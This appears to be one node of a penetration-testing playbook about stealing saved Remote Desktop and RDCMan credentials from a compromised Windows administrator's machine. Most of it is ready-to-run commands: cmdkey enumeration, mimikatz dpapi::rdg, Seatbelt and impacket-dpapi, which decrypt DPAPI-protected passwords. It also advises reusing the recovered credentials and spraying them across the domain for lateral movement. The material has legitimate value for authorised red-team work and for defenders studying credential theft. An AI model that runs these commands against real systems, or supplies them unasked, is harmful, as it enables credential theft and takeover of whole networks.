title: RDCMan / RDP Saved Creds — DPAPI Decrypt
body:
Remote Desktop Connection Manager (RDCMan) and saved .rdp files stash credentials for other hosts — encrypted with the user's DPAPI master key. If you land on an admin's box, RDCMan.settings is a goldmine: it often holds creds to servers you can't otherwise reach, including the DC. This is a classic 'foothold user was a sysadmin' win — their saved connections ARE your lateral movement map.

Where to look:
  %LOCALAPPDATA%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
  %USERPROFILE%\Documents\*.rdp  (saved RDP files with 'password 51:b:' blobs)
  Credential Manager (cmdkey /list) — saved RDP/domain creds

The creds are DPAPI-encrypted to the USER. You need either (a) that user's context (a shell as them), or (b) their DPAPI masterkey + the blob to decrypt offline. Running as the user is the easy path — mimikatz dpapi::rdg does it in-session.
cmd:
# ══════════════════════════════════════════════════════
# FIND SAVED RDP / RDCMAN CREDENTIALS
# ══════════════════════════════════════════════════════
# Saved RDP creds in Credential Manager (fast first check):
cmdkey /list
#   Look for 'Target: Domain:target=TERMSRV/<host>' entries.
#   These can be REUSED without cracking: runas /savecred, or
#   mstsc with the saved cred, or seatbelt below to extract.

# RDCMan settings file:
dir /s /b "%LOCALAPPDATA%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings"
type "%LOCALAPPDATA%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings"

# Saved .rdp files (password 51:b: = DPAPI blob):
dir /s /b %USERPROFILE%\*.rdp

# ══════════════════════════════════════════════════════
# DECRYPT — in the USER's context (easiest)
# ══════════════════════════════════════════════════════
# mimikatz decrypts RDCMan.settings directly if you're that user:
.\mimikatz.exe "dpapi::rdg /in:\"%LOCALAPPDATA%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings\" /unprotect" "exit"

# Seatbelt harvests RDP saved sessions + cmdkey creds:
.\Seatbelt.exe RDPSavedConnections RDCManFiles CredEnum

# ══════════════════════════════════════════════════════
# DECRYPT — offline with the DPAPI masterkey (if not in-session)
# ══════════════════════════════════════════════════════
# See the dpapi node for masterkey extraction. Once you have the
# plaintext masterkey, decrypt the blob remotely:
impacket-dpapi rdg -file RDCMan.settings -key 0x<decrypted-masterkey>
warn: RDCMan/RDP creds are DPAPI-bound to the USER, not the machine — you can only decrypt them in that user's context or with their masterkey. cmdkey /list is the fastest check and those saved creds are often reusable with runas /savecred WITHOUT decrypting. This is a 'sysadmin foothold' jackpot: their saved connections map the internal network for you. Always spray any recovered cred across the domain (nxc) — admins reuse.

choices.label: Got creds — spray / reuse across the domain
Recovered a working cred — lateral movement
